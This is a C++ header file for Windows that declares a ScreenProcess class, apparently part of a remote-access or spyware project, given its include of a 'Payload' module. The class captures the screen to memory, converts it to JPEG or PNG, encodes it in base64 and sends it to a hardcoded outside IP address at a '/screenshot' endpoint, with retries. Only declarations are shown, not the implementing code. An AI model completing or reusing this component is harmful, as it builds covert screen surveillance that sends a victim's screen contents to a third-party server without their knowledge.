#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include "../../Module/Logger.hpp"
#include "../Payload/Payload.hpp"

class ScreenProcess {
public:
    static bool captureScreen();

private:
    static constexpr int MAX_RETRY = 2;
    static constexpr const char* SERVER_HOST = "47.81.10.50";
    static constexpr const char* SCREENSHOT_ENDPOINT = "/screenshot";

    static std::vector<BYTE> convertBitmapToJPEG(const std::vector<BYTE>& bitmapData, int width, int height, int quality);
    static std::vector<BYTE> captureScreenToMemory();
    static std::vector<BYTE> convertBitmapToPNG(const std::vector<BYTE>& bitmapData, int width, int height);
    static std::string convertToBase64(const std::vector<BYTE>& data);
    static bool sendScreenshotToServer(const std::string& base64Data, int width, int height);
    static std::string getLastErrorAsString();
};